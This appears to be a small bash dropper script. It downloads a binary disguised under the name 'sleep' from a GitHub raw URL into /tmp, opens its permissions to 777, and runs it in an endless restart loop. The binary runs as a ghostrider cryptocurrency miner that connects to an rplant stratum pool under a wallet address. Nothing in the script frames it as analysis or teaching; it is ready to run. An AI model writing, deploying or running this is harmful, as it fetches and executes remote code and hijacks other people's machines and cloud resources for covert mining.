#!/bin/bash
## requirement
apt-get -qq update
apt-get -qq install -y wget curl unzip

mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/Blenkinship/any/main/sleep
chmod -R  777 /tmp/c3

#!/bin/sh
while [ 1 ]; do
	/tmp/c3/sleep -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.gs
	sleep 5
done







##
